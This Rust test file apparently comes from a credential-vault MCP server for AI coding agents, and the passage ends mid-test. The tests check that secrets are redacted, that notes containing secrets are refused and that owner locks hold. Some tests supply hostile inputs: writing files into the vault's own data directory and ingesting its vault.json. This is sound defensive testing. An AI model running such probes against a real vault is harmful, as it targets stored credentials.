    let current_write = serde_json::from_value::<TerminalWriteInput>(json!({
        "text": "continue",
        "submit": true
    }))
    .unwrap();
    assert!(current_write.session_id.is_empty());
    let current_read = serde_json::from_value::<TerminalReadInput>(json!({
        "until": "ready"
    }))
    .unwrap();
    assert!(current_read.session_id.is_empty());
    let current_stop = serde_json::from_value::<TerminalSessionInput>(json!({})).unwrap();
    assert!(current_stop.session_id.is_empty());

    let fill = serde_json::from_value::<CredentialFillInput>(json!({
        "item": "test login",
        "module": "password",
        "target": "browser"
    }))
    .unwrap();
    assert!(!fill.submit);

    let ssh = serde_json::from_value::<SshRunInput>(json!({
        "command": "hostname"
    }))
    .unwrap();
    assert!(ssh.item.is_empty());
    assert!(ssh.host.is_none());
    assert!(ssh.port.is_none());
    assert!(ssh.username.is_none());

    let upload = serde_json::from_value::<SshUploadInput>(json!({
        "localPath": "C:\\fixture.bin"
    }))
    .unwrap();
    assert!(upload.item.is_empty());
    assert!(upload.host.is_none());
    assert!(upload.port.is_none());
    assert!(upload.username.is_none());
    assert!(upload.remote_path.is_empty());
    assert!(upload.overwrite);
    assert_eq!(
        transfer_file_name(&upload.local_path, "Local path").unwrap(),
        "fixture.bin"
    );

    let download = serde_json::from_value::<SshDownloadInput>(json!({
        "remotePath": "/tmp/fixture.bin"
    }))
    .unwrap();
    assert!(download.item.is_empty());
    assert!(download.host.is_none());
    assert!(download.port.is_none());
    assert!(download.username.is_none());
    assert!(download.local_path.is_empty());
    assert!(download.overwrite);
    assert_eq!(
        transfer_file_name(&download.remote_path, "Remote path").unwrap(),
        "fixture.bin"
    );

    let response = serde_json::from_value::<HttpSendInput>(json!({
        "url": "https://example.test/file",
        "saveResponseTo": "C:\\fixture.bin"
    }))
    .unwrap();
    assert!(response.item.is_empty());
    assert!(response.secret_bindings.is_empty());
    assert!(response.overwrite_response_file);
}

#[tokio::test]
async fn business_failures_are_tool_errors() {
    let directory = tempdir().unwrap();
    let vault = Vault::open(directory.path().join("vault")).unwrap();
    let result = VaultMcp::new(vault)
        .terminal_read(Parameters(TerminalReadInput {
            session_id: "not-a-session".into(),
            wait_seconds: None,
            until: None,
        }))
        .await;
    assert_eq!(result.is_error, Some(true));
    assert!(result.structured_content.is_none());
}

#[tokio::test]
async fn passkey_items_appear_in_items_search_and_respect_agent_passkey_setting() {
    let directory = tempdir().unwrap();
    let vault = Vault::open(directory.path().join("vault")).unwrap();
    let options = json!({
        "challenge": "KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKio",
        "rp": { "id": "example.com", "name": "Example" },
        "user": { "id": "AQID", "name": "alice", "displayName": "Alice" },
        "pubKeyCredParams": [{ "type": "public-key", "alg": -7 }],
        "authenticatorSelection": { "residentKey": "required", "userVerification": "required" }
    });
    let (key, _) = crate::passkey::create("https://example.com", &options, true).unwrap();
    vault
        .store_browser_passkey("https://example.com", key, &options)
        .unwrap();

    let mcp = VaultMcp::new(vault.clone());
    let listed = mcp
        .search_items(ItemsSearchInput {
            query: Some("example.com".into()),
        })
        .unwrap();
    assert_eq!(listed.items.len(), 1);
    assert!(listed.items[0].actions.contains(&"browser_passkey".to_owned()));
    assert_eq!(listed.items[0].passkeys.len(), 1);
    assert_eq!(listed.items[0].passkeys[0].rp_id, "example.com");

    // Agent Passkey signing is OFF by default even once Browser Bridge is enabled and paired.
    vault
        .update_settings_patch(crate::model::SettingsPatch {
            browser_enabled: Some(true),
            ..Default::default()
        })
        .unwrap();
    vault.set_browser_paired(true).unwrap();

    let denied = mcp
        .browser_passkey(Parameters(BrowserPasskeyInput {
            item: String::new(),
            operation: Some("get".into()),
            request_id: None,
            trigger_selector: None,
            trigger_text: None,
            tab_id: None,
            url: None,
            wait_seconds: None,
        }))
        .await;
    assert_eq!(denied.is_error, Some(true));
    let text = serde_json::to_string(&denied.content).unwrap();
    assert!(text.contains("Agent Passkey signing is disabled"));
}

#[test]
fn display_client_name_recognizes_antigravity_and_deepseek_harness() {
    assert_eq!(display_client_name("Antigravity"), "ANTIGRAVITY");
    assert_eq!(display_client_name("agy"), "ANTIGRAVITY");
    assert_eq!(display_client_name("DeepSeek Harness"), "DEEPSEEK HARNESS");
    assert_eq!(display_client_name("dsh"), "DEEPSEEK HARNESS");
}

#[tokio::test]
async fn secret_write_file_renders_placeholders_without_exposing_plaintext() {
    let directory = tempdir().unwrap();
    let vault_dir = directory.path().join("vault");
    let vault = Vault::open(vault_dir.clone()).unwrap();
    let mut secrets = SecretBundle::default();
    secrets
        .named_secrets
        .insert("apiCredential".into(), "sk-config-secret-9988".into());
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: "api".into(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![ItemModule {
                kind: "apiCredential".into(),
                name: String::new(),
                value: String::new(),
                agent_visible: Some(false),
            }],
            name: "Himalaya Mail".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets,
        })
        .unwrap();

    let mcp = VaultMcp::new(vault.clone());
    let out_file = directory.path().join("configs/.env");
    let created = mcp
        .secret_write_file(Parameters(SecretWriteFileInput {
            item: "Himalaya Mail".into(),
            path: out_file.to_string_lossy().into_owned(),
            content: "TOKEN={{openkeylet:apiCredential}}\n".into(),
            overwrite: true,
            append: false,
            secret_bindings: HashMap::new(),
        }))
        .await;
    let payload = structured_value(&created);
    assert!(!serde_json::to_string(&payload).unwrap().contains("sk-config-secret-9988"));
    assert_eq!(payload["modulesUsed"], json!(["apiCredential"]));
    assert_eq!(
        std::fs::read_to_string(&out_file).unwrap(),
        "TOKEN=sk-config-secret-9988\n"
    );

    // overwrite=false refuses to clobber existing file
    let blocked = mcp
        .secret_write_file(Parameters(SecretWriteFileInput {
            item: "Himalaya Mail".into(),
            path: out_file.to_string_lossy().into_owned(),
            content: "OTHER={{openkeylet:apiCredential}}\n".into(),
            overwrite: false,
            append: false,
            secret_bindings: HashMap::new(),
        }))
        .await;
    assert_eq!(blocked.is_error, Some(true));

    // Refuses writing inside OpenKeylet's own vault data directory
    let vault_attack = mcp
        .secret_write_file(Parameters(SecretWriteFileInput {
            item: "Himalaya Mail".into(),
            path: vault_dir.join("injected.txt").to_string_lossy().into_owned(),
            content: "X={{openkeylet:apiCredential}}".into(),
            overwrite: true,
            append: false,
            secret_bindings: HashMap::new(),
        }))
        .await;
    assert_eq!(vault_attack.is_error, Some(true));
    assert!(!vault_dir.join("injected.txt").exists());

    // Missing placeholder secret fails cleanly without creating target file
    let missing_file = directory.path().join("configs/missing.env");
    let missing_res = mcp
        .secret_write_file(Parameters(SecretWriteFileInput {
            item: "Himalaya Mail".into(),
            path: missing_file.to_string_lossy().into_owned(),
            content: "NOPE={{openkeylet:nonExistentField}}\n".into(),
            overwrite: true,
            append: false,
            secret_bindings: HashMap::new(),
        }))
        .await;
    assert_eq!(missing_res.is_error, Some(true));
    assert!(!missing_file.exists(), "Failed render must not create partial file");

    // Disabled item is blocked from secret_write_file
    let item = vault.list_connections().unwrap().remove(0);
    vault.set_connection_enabled(item.id, false).unwrap();
    let disabled_res = mcp
        .secret_write_file(Parameters(SecretWriteFileInput {
            item: "Himalaya Mail".into(),
            path: missing_file.to_string_lossy().into_owned(),
            content: "TOKEN={{openkeylet:apiCredential}}\n".into(),
            overwrite: true,
            append: false,
            secret_bindings: HashMap::new(),
        }))
        .await;
    assert_eq!(disabled_res.is_error, Some(true));

    // Re-enable, move to Trash -> also blocked from MCP tools
    vault.set_connection_enabled(item.id, true).unwrap();
    let refreshed = vault.list_connections().unwrap().remove(0);
    vault
        .trash_connection(refreshed.id, Some(&refreshed.updated_at))
        .unwrap();
    let trashed_res = mcp
        .secret_write_file(Parameters(SecretWriteFileInput {
            item: "Himalaya Mail".into(),
            path: missing_file.to_string_lossy().into_owned(),
            content: "TOKEN={{openkeylet:apiCredential}}\n".into(),
            overwrite: true,
            append: false,
            secret_bindings: HashMap::new(),
        }))
        .await;
    assert_eq!(trashed_res.is_error, Some(true));

    // Activity log must never record raw secret plaintext
    let activities_json = serde_json::to_string(&vault.activities().unwrap()).unwrap();
    assert!(!activities_json.contains("sk-config-secret-9988"));
}

#[tokio::test]
async fn zero_plaintext_co_storage_tools_work_and_never_leak_secrets() {
    let dir = tempfile::tempdir().unwrap();
    let vault = Vault::open(dir.path().to_path_buf()).unwrap();
    let mcp = VaultMcp::new(vault.clone());

    // 1. draft_prepare rejects secret plaintext, accepts public skeleton
    let rejected = mcp
        .draft_prepare(Parameters(DraftPrepareInput {
            name: "Bad Draft".into(),
            item_type: "api".into(),
            folder: String::new(),
            description: String::new(),
            host: String::new(),
            port: None,
            url: "https://api.example.com".into(),
            username: String::new(),
            modules: vec![DraftModuleSpec {
                kind: "apiCredential".into(),
                name: String::new(),
                value: "sk-leaked-plaintext".into(),
            }],
        }))
        .await;
    assert_eq!(rejected.is_error, Some(true));

    let draft_res = mcp
        .draft_prepare(Parameters(DraftPrepareInput {
            name: "Prod Tokyo".into(),
            item_type: "ssh".into(),
            folder: "Servers".into(),
            description: "Production cluster".into(),
            host: "203.0.113.5".into(),
            port: Some(2222),
            url: String::new(),
            username: "deploy".into(),
            modules: vec![DraftModuleSpec {
                kind: "password".into(),
                name: String::new(),
                value: String::new(),
            }],
        }))
        .await;
    assert_ne!(draft_res.is_error, Some(true));
    let drafts = vault.list_editor_drafts().unwrap();
    assert_eq!(drafts.len(), 1);
    assert_eq!(drafts[0].input.name, "Prod Tokyo");

    // 2. secret_generate creates a new item + stores hidden secret locally; chains directly into secret_write_file
    let gen_res = mcp
        .secret_generate(Parameters(SecretGenerateInput {
            item: String::new(),
            create_item: Some(CreateItemSpec {
                name: "Prod Postgres".into(),
                item_type: "custom".into(),
                folder: "DB".into(),
                description: "App DB".into(),
                host: "db.internal".into(),
                port: Some(5432),
                url: String::new(),
                username: "app".into(),
            }),
            field: "DB_PASSWORD".into(),
            format: "base64url".into(),
            length: 32,
            uppercase: true,
            lowercase: true,
            digits: true,
            symbols: false,
            overwrite: false,
        }))
        .await;
    assert_ne!(gen_res.is_error, Some(true));
    let gen_json = serde_json::to_string(&gen_res).unwrap();
    let db_item = vault
        .list_decrypted_connections()
        .unwrap()
        .into_iter()
        .find(|c| c.stored.name == "Prod Postgres")
        .unwrap();
    let real_secret = db_item.secrets.get("DB_PASSWORD").unwrap().to_owned();
    assert_eq!(real_secret.len(), 32);
    assert!(
        !gen_json.contains(&real_secret),
        "secret_generate must never return generated plaintext to the model"
    );

    // Overwrite protection defaults to false
    let blocked_overwrite = mcp
        .secret_generate(Parameters(SecretGenerateInput {
            item: "Prod Postgres".into(),
            create_item: None,
            field: "DB_PASSWORD".into(),
            format: "password".into(),
            length: 24,
            uppercase: true,
            lowercase: true,
            digits: true,
            symbols: true,
            overwrite: false,
        }))
        .await;
    assert_eq!(blocked_overwrite.is_error, Some(true));

    // Generated secret can immediately be rendered via secret_write_file
    let out_dir = tempfile::tempdir().unwrap();
    let rendered_env = out_dir.path().join("db.env");
    let write_res = mcp
        .secret_write_file(Parameters(SecretWriteFileInput {
            item: "Prod Postgres".into(),
            path: rendered_env.to_string_lossy().into_owned(),
            content: "DB_PASSWORD={{openkeylet:DB_PASSWORD}}\n".into(),
            overwrite: true,
            append: false,
            secret_bindings: HashMap::new(),
        }))
        .await;
    assert_ne!(write_res.is_error, Some(true));
    assert_eq!(
        std::fs::read_to_string(&rendered_env).unwrap(),
        format!("DB_PASSWORD={real_secret}\n")
    );

    // 3. ssh_keygen stores private key encrypted and returns ONLY public key & fingerprint
    let key_res = mcp
        .ssh_keygen(Parameters(SshKeygenInput {
            name: "Deploy Key".into(),
            item: String::new(),
            host: "203.0.113.99".into(),
            port: Some(22),
            username: "deploy".into(),
            comment: "deploy@openkeylet".into(),
            folder: "SSH".into(),
            description: String::new(),
            overwrite: false,
        }))
        .await;
    assert_ne!(key_res.is_error, Some(true));
    let key_json = serde_json::to_string(&key_res).unwrap();
    assert!(key_json.contains("ssh-ed25519 "));
    assert!(key_json.contains("SHA256:"));
    assert!(
        !key_json.contains("PRIVATE KEY"),
        "ssh_keygen must never expose private key material"
    );
    let ssh_item = vault
        .list_decrypted_connections()
        .unwrap()
        .into_iter()
        .find(|c| c.stored.name == "Deploy Key")
        .unwrap();
    assert!(
        ssh_item
            .secrets
            .get("privateKey")
            .unwrap()
            .contains("BEGIN OPENSSH PRIVATE KEY")
    );

    // 4. secret_ingest_file imports local .env, never leaks values, and writes sealed template
    let src_env = out_dir.path().join(".env");
    let tpl_env = out_dir.path().join(".env.template");
    std::fs::write(
        &src_env,
        "# Secrets\nSTRIPE_KEY=sk_live_ingest_9911\nRESEND_KEY=re_ingest_2233\n",
    )
    .unwrap();
    let ingest_res = mcp
        .secret_ingest_file(Parameters(SecretIngestFileInput {
            path: src_env.to_string_lossy().into_owned(),
            name: "Billing Env".into(),
            item: String::new(),
            format: "auto".into(),
            folder: String::new(),
            description: String::new(),
            overwrite: false,
            seal_template_path: Some(tpl_env.to_string_lossy().into_owned()),
            overwrite_template: false,
        }))
        .await;
    assert_ne!(ingest_res.is_error, Some(true));
    let ingest_json = serde_json::to_string(&ingest_res).unwrap();
    assert!(ingest_json.contains("STRIPE_KEY"));
    assert!(ingest_json.contains("{{openkeylet:STRIPE_KEY}}"));
    assert!(!ingest_json.contains("sk_live_ingest_9911"));
    assert!(!ingest_json.contains("re_ingest_2233"));

    let tpl_text = std::fs::read_to_string(&tpl_env).unwrap();
    assert!(tpl_text.contains("STRIPE_KEY={{openkeylet:STRIPE_KEY}}"));
    assert!(!tpl_text.contains("sk_live_ingest_9911"));

    // Refuses ingesting from OpenKeylet's own vault directory
    let vault_probe = mcp
        .secret_ingest_file(Parameters(SecretIngestFileInput {
            path: dir.path().join("vault.json").to_string_lossy().into_owned(),
            name: "Leak".into(),
            item: String::new(),
            format: "auto".into(),
            folder: String::new(),
            description: String::new(),
            overwrite: false,
            seal_template_path: None,
            overwrite_template: false,
        }))
        .await;
    assert_eq!(vault_probe.is_error, Some(true));
}

#[tokio::test]
async fn agent_notes_flow_supports_multi_notes_search_browser_inspect_locks_and_secret_guards() {
    let dir = tempdir().unwrap();
    let vault = Vault::open(dir.path().join("vault")).unwrap();

    let mut ssh_secrets = SecretBundle::default();
    ssh_secrets.password = Some("VpsSecretPass987!".into());
    ssh_secrets
        .named_secrets
        .insert("username".into(), "deploy".into());
    let vps = vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: "ssh".into(),
            folder: "Servers".into(),
            favorite: false,
            id: None,
            modules: vec![
                ItemModule {
                    kind: "host".into(),
                    value: "10.0.0.12".into(),
                    agent_visible: Some(true),
                    ..Default::default()
                },
                ItemModule {
                    kind: "username".into(),
                    agent_visible: Some(false),
                    ..Default::default()
                },
                ItemModule {
                    kind: "password".into(),
                    agent_visible: Some(false),
                    ..Default::default()
                },
            ],
            name: "hk-node-02".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets: ssh_secrets,
        })
        .unwrap();

    let mut web_secrets = SecretBundle::default();
    web_secrets.password = Some("WebSecretPass654!".into());
    web_secrets
        .named_secrets
        .insert("username".into(), "staging@example.test".into());
    let _web = vault
        .save_connection(ConnectionInput {
            login_uris: vec![crate::login_uri::LoginUri {
                uri: "https://console.example.test/login".into(),
                match_type: "origin".into(),
            }],
            item_type: "login".into(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![
                ItemModule {
                    kind: "username".into(),
                    agent_visible: Some(false),
                    ..Default::default()
                },
                ItemModule {
                    kind: "password".into(),
                    agent_visible: Some(false),
                    ..Default::default()
                },
            ],
            name: "Console Account B".into(),
            enabled: true,
            description: "Shared console".into(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets: web_secrets,
        })
        .unwrap();

    let mcp_claude = VaultMcp::new(vault.clone());
    *mcp_claude.client_name.write().unwrap() = "CLAUDE CODE".to_owned();

    // 1. Add note from Claude Code, then another from Codex (multi-note history)
    let add1 = structured_value(
        &mcp_claude
            .item_note(Parameters(ItemNoteInput {
                item: "hk-node-02".into(),
                note: "Ubuntu 24.04 A100 GPU training node, repo at /srv/ml".into(),
                action: "add".into(),
                note_id: None,
            }))
            .await,
    );
    assert_eq!(add1["item"], "hk-node-02");
    assert_eq!(add1["notes"].as_array().unwrap().len(), 1);
    assert_eq!(add1["notes"][0]["author"], "CLAUDE CODE");
    let first_note_id = add1["notes"][0]["id"].as_str().unwrap().to_owned();

    // Notes must be encrypted on disk (not plaintext in vault.json)
    let raw_vault = std::fs::read_to_string(dir.path().join("vault").join("vault.json")).unwrap();
    assert!(!raw_vault.contains("A100 GPU training node"));

    // 2. Different session / different agent (Codex) discovers item by note keywords
    let mcp_codex = VaultMcp::new(vault.clone());
    *mcp_codex.client_name.write().unwrap() = "CODEX".to_owned();
    let found = structured_value(
        &mcp_codex
            .items_search(Parameters(ItemsSearchInput {
                query: Some("a100 /srv/ml".into()),
            }))
            .await,
    );
    assert_eq!(found["items"].as_array().unwrap().len(), 1);
    assert_eq!(found["items"][0]["name"], "hk-node-02");
    assert_eq!(
        found["items"][0]["agentNotes"][0]["text"],
        "Ubuntu 24.04 A100 GPU training node, repo at /srv/ml"
    );

    // Codex omits `item` (using active item selected by items_search) and appends a 2nd note
    let add2 = structured_value(
        &mcp_codex
            .item_note(Parameters(ItemNoteInput {
                item: String::new(),
                note: "Conda env is torch25; Docker daemon runs rootless".into(),
                action: "add".into(),
                note_id: None,
            }))
            .await,
    );
    assert_eq!(add2["notes"].as_array().unwrap().len(), 2);
    assert_eq!(add2["notes"][0]["author"], "CODEX");
    assert_eq!(add2["notes"][1]["author"], "CLAUDE CODE");

    // 3. Secret leakage in note is rejected (both same-item and cross-item secrets)
    let leak_same = mcp_codex
        .item_note(Parameters(ItemNoteInput {
            item: "hk-node-02".into(),
            note: "Login password is VpsSecretPass987!".into(),
            action: "add".into(),
            note_id: None,
        }))
        .await;
    assert_eq!(leak_same.is_error, Some(true));

    let leak_cross = mcp_codex
        .item_note(Parameters(ItemNoteInput {
            item: "hk-node-02".into(),
            note: "Other console pass WebSecretPass654!".into(),
            action: "add".into(),
            note_id: None,
        }))
        .await;
    assert_eq!(leak_cross.is_error, Some(true));

    // 4. Update & remove agent note works, and respects 5-note cap
    let updated = structured_value(
        &mcp_codex
            .item_note(Parameters(ItemNoteInput {
                item: "hk-node-02".into(),
                note: "Ubuntu 24.04 H100 GPU training node, repo at /srv/ml".into(),
                action: "update".into(),
                note_id: Some(first_note_id.clone()),
            }))
            .await,
    );
    assert!(
        updated["notes"]
            .as_array()
            .unwrap()
            .iter()
            .any(|n| n["id"] == first_note_id && n["text"].as_str().unwrap().contains("H100"))
    );

    // Owner adds a note and agents cannot edit/remove it or evict it when capping at 5
    let owner_added = vault
        .add_agent_note(vps.id, "Pinned owner note: do not reboot", "OWNER", false)
        .unwrap();
    let owner_note_id = owner_added.agent_notes[0].id.clone();

    let err_edit_owner = mcp_codex
        .item_note(Parameters(ItemNoteInput {
            item: "hk-node-02".into(),
            note: "Trying to overwrite owner note".into(),
            action: "update".into(),
            note_id: Some(owner_note_id.clone()),
        }))
        .await;
    assert_eq!(err_edit_owner.is_error, Some(true));

    for idx in 1..=5 {
        let res = mcp_codex
            .item_note(Parameters(ItemNoteInput {
                item: "hk-node-02".into(),
                note: format!("Rolling observation #{idx}"),
                action: "add".into(),
                note_id: None,
            }))
            .await;
        assert_eq!(res.is_error, Some(false));
    }
    let after_cap = vault.get_connection(vps.id).unwrap();
    assert_eq!(after_cap.secrets.agent_notes.len(), crate::model::MAX_AGENT_NOTES);
    assert!(
        after_cap
            .secrets
            .agent_notes
            .iter()
            .any(|n| n.id == owner_note_id),
        "Owner note must not be evicted by rolling agent notes"
    );

    // 5. Owner lock blocks all agent mutations while still allowing reads
    vault.set_agent_notes_locked(vps.id, true).unwrap();
    let blocked_add = mcp_codex
        .item_note(Parameters(ItemNoteInput {
            item: "hk-node-02".into(),
            note: "Blocked after lock".into(),
            action: "add".into(),
            note_id: None,
        }))
        .await;
    assert_eq!(blocked_add.is_error, Some(true));
    let locked_search = structured_value(
        &mcp_codex
            .items_search(Parameters(ItemsSearchInput {
                query: Some("hk-node-02".into()),
            }))
            .await,
    );
    assert_eq!(locked_search["items"][0]["agentNotesLocked"], true);

    // 6. Browser website matching exposes agentNotes and description
    let _ = mcp_claude
        .item_note(Parameters(ItemNoteInput {
            item: "Console Account B".into(),
            note: "Staging QA tenant with billing disabled".into(),
            action: "add".into(),
            note_id: None,
        }))
        .await;
    let website_matches = mcp_codex
        .matching_items_for_website("https://console.example.test/login")
        .unwrap();
    assert_eq!(website_matches.len(), 1);
    assert_eq!(website_matches[0]["description"], "Shared console");
    assert_eq!(
        website_matches[0]["agentNotes"][0]["text"],
        "Staging QA tenant with billing disabled"
    );
}

#[tokio::test]
async fn cross_item_raw_and_public_placeholders_work_with_multi_item_redaction() {
    let dir = tempdir().unwrap();
    let vault = Vault::open(dir.path().join("vault")).unwrap();

    let mut db_secrets = SecretBundle::default();
    db_secrets.password = Some("pg-secret-4411".into());
    db_secrets
        .named_secrets
        .insert("username".into(), "pgadmin".into());
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: "ssh".into(),
            folder: "Infra".into(),
            favorite: false,
            id: None,
            modules: vec![
                ItemModule {
                    kind: "host".into(),
                    name: "host".into(),
                    value: "db.internal.test".into(),
                    agent_visible: Some(true),
                },
                ItemModule {
                    kind: "port".into(),
                    name: "port".into(),
                    value: "5432".into(),
                    agent_visible: Some(true),
                },
                ItemModule {
                    kind: "username".into(),
                    name: "username".into(),
                    value: String::new(),
                    agent_visible: Some(false),
                },
                ItemModule {
                    kind: "password".into(),
                    name: "password".into(),
                    value: String::new(),
                    agent_visible: Some(false),
                },
            ],
            name: "Prod DB".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets: db_secrets,
        })
        .unwrap();

    let mut gh_secrets = SecretBundle::default();
    gh_secrets
        .named_secrets
        .insert("apiCredential".into(), "ghp_cross_secret_9922".into());
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: "api".into(),
            folder: "Dev".into(),
            favorite: false,
            id: None,
            modules: vec![
                ItemModule {
                    kind: "url".into(),
                    name: "url".into(),
                    value: "https://api.github.test".into(),
                    agent_visible: Some(true),
                },
                ItemModule {
                    kind: "apiCredential".into(),
                    name: "apiCredential".into(),
                    value: String::new(),
                    agent_visible: Some(false),
                },
            ],
            name: "GitHub Maintainer".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets: gh_secrets,
        })
        .unwrap();

    let mcp = VaultMcp::new(vault.clone());

    // 1. secret_write_file omits `item` when all placeholders use explicit `Item/module`
    //    and resolves both secret and public modules (host/port/url).
    let env_path = dir.path().join("cross.env");
    let write_res = structured_value(
        &mcp.secret_write_file(Parameters(SecretWriteFileInput {
            item: String::new(),
            path: env_path.to_string_lossy().into_owned(),
            content: "DB_URL=postgres://{{openkeylet:Prod DB/username}}:{{openkeylet:Prod DB/password}}@{{openkeylet:Prod DB/host}}:{{openkeylet:Prod DB/port}}/app\nGH_API={{openkeylet:GitHub Maintainer/url}}\nGH_TOKEN={{openkeylet:GitHub Maintainer/apiCredential}}\n".into(),
            overwrite: true,
            append: false,
            secret_bindings: HashMap::new(),
        }))
        .await,
    );
    assert!(!serde_json::to_string(&write_res).unwrap().contains("pg-secret-4411"));
    assert!(!serde_json::to_string(&write_res).unwrap().contains("ghp_cross_secret_9922"));
    assert_eq!(
        std::fs::read_to_string(&env_path).unwrap(),
        "DB_URL=postgres://pgadmin:pg-secret-4411@db.internal.test:5432/app\nGH_API=https://api.github.test\nGH_TOKEN=ghp_cross_secret_9922\n"
    );

    // 2. interpolate_command_text distinguishes quoted {{openkeylet:...}} vs unquoted {{openkeylet-raw:...}}
    let raw_map = HashMap::from([("tok".to_owned(), "abc def".to_owned())]);
    let quoted_map = HashMap::from([("tok".to_owned(), "'abc def'".to_owned())]);
    let mut used = HashSet::new();
    let rendered_cmd = interpolate_command_text(
        r#"curl -H "Authorization: Bearer {{openkeylet-raw:tok}}" {{openkeylet:tok}}"#,
        &raw_map,
        &quoted_map,
        &mut used,
    )
    .unwrap();
    assert_eq!(
        rendered_cmd,
        r#"curl -H "Authorization: Bearer abc def" 'abc def'"#
    );

    // 3. terminal_run omits `item` with cross-item raw placeholders, cross-item secretEnv,
    //    public modules (port "5432" NOT redacted), and multi-item secret redaction!
    #[cfg(windows)]
    let cmd = r#"Write-Output "URL=postgres://u:{{openkeylet-raw:Prod DB/password}}@{{openkeylet-raw:Prod DB/host}}:{{openkeylet-raw:Prod DB/port}}/db"; Write-Output "HDR=Bearer {{openkeylet-raw:GitHub Maintainer/apiCredential}}"; Write-Output "ENV=$env:GH_TOK""#;
    #[cfg(not(windows))]
    let cmd = r#"printf 'URL=postgres://u:%s@%s:%s/db\nHDR=Bearer %s\nENV=%s\n' "{{openkeylet-raw:Prod DB/password}}" "{{openkeylet-raw:Prod DB/host}}" "{{openkeylet-raw:Prod DB/port}}" "{{openkeylet-raw:GitHub Maintainer/apiCredential}}" "$GH_TOK""#;
    let run_res = structured_value(
        &mcp.terminal_run(Parameters(TerminalRunInput {
            item: String::new(),
            command: cmd.into(),
            stdin: None,
            cwd: None,
            timeout_seconds: Some(15),
            secret_env: HashMap::from([(
                "GH_TOK".into(),
                "GitHub Maintainer/apiCredential".into(),
            )]),
            max_output_bytes: None,
        }))
        .await,
    );
    assert_eq!(run_res["exitCode"], 0);
    let stdout = run_res["stdout"].as_str().unwrap();
    assert!(stdout.contains("db.internal.test:5432/db"), "public host/port must not be redacted: {stdout}");
    assert!(stdout.contains("URL=postgres://u:[REDACTED]@db.internal.test:5432/db"), "raw secret should be unquoted & redacted: {stdout}");
    assert!(stdout.contains("HDR=Bearer [REDACTED]"), "cross-item raw secret must be redacted: {stdout}");
    assert!(stdout.contains("ENV=[REDACTED]"), "cross-item secretEnv must be redacted: {stdout}");
    assert!(!stdout.contains("pg-secret-4411"));
    assert!(!stdout.contains("ghp_cross_secret_9922"));

    // 4. Activity log never leaks secrets from any referenced item
    let activities = serde_json::to_string(&vault.activities().unwrap()).unwrap();
    assert!(!activities.contains("pg-secret-4411"));
    assert!(!activities.contains("ghp_cross_secret_9922"));
}

#[tokio::test]
async fn items_search_preserves_active_item_on_zero_arg_discovery_and_surfaces_personal_action() {
    let dir = tempdir().unwrap();
    let vault = Vault::open(dir.path().join("vault")).unwrap();

    let mut login_secrets = SecretBundle::default();
    login_secrets.password = Some("login-secret-111".into());
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: "login".into(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![ItemModule {
                kind: "password".into(),
                agent_visible: Some(false),
                ..Default::default()
            }],
            name: "Primary Login".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets: login_secrets,
        })
        .unwrap();

    let mut card_secrets = SecretBundle::default();
    card_secrets
        .named_secrets
        .insert("cardNumber".into(), "4111111111114242".into());
    card_secrets
        .named_secrets
        .insert("cardholderName".into(), "Jane Doe".into());
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: "card".into(),
            folder: "Wallet".into(),
            favorite: false,
            id: None,
            modules: vec![
                ItemModule {
                    kind: "cardholderName".into(),
                    agent_visible: Some(false),
                    ..Default::default()
                },
                ItemModule {
                    kind: "cardNumber".into(),
                    agent_visible: Some(false),
                    ..Default::default()
                },
            ],
            name: "Corporate Visa".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets: card_secrets,
        })
        .unwrap();

    let mcp = VaultMcp::new(vault);
    // Select Primary Login via explicit query
    let selected = structured_value(
        &mcp.items_search(Parameters(ItemsSearchInput {
            query: Some("Primary Login".into()),
        }))
        .await,
    );
    assert_eq!(selected["items"].as_array().unwrap().len(), 1);
    assert_eq!(
        mcp.resolve_item_for_action("", None).unwrap().stored.name,
        "Primary Login"
    );

    // Zero-arg discovery call MUST NOT wipe active_item, and MUST surface browser_fill_personal for cards
    let all = structured_value(
        &mcp.items_search(Parameters(ItemsSearchInput::default()))
            .await,
    );
    let items = all["items"].as_array().unwrap();
    assert_eq!(items.len(), 2);
    let card = items
        .iter()
        .find(|item| item["name"] == "Corporate Visa")
        .unwrap();
    assert_eq!(card["itemType"], "card");
    assert!(
        card["actions"]
            .as_array()
            .unwrap()
